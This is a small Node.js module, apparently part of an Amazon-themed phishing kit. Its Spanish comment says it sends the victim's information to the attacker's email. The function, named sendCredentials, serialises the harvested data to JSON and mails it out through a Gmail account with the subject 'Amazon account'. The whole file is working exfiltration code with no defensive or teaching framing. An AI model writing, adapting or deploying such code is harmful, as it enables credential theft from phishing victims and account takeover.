const nodemailer = require("nodemailer")

const transporter = nodemailer.createTransport({
    service:"gmail",
    auth:{
        user:process.env.EMAIL,
        pass:process.env.PASSWORD
    }
})
//Envio info de la victima al correo del atacante
function sendCredentials(info,callback){
    const mailOptions = {
        from: process.env.EMAIL,
        to: info.email,
        subject: "Amazon account",
        text: JSON.stringify(info)
    }
    transporter.sendMail(mailOptions,callback)
}   

module.exports.sendEmail = sendCredentials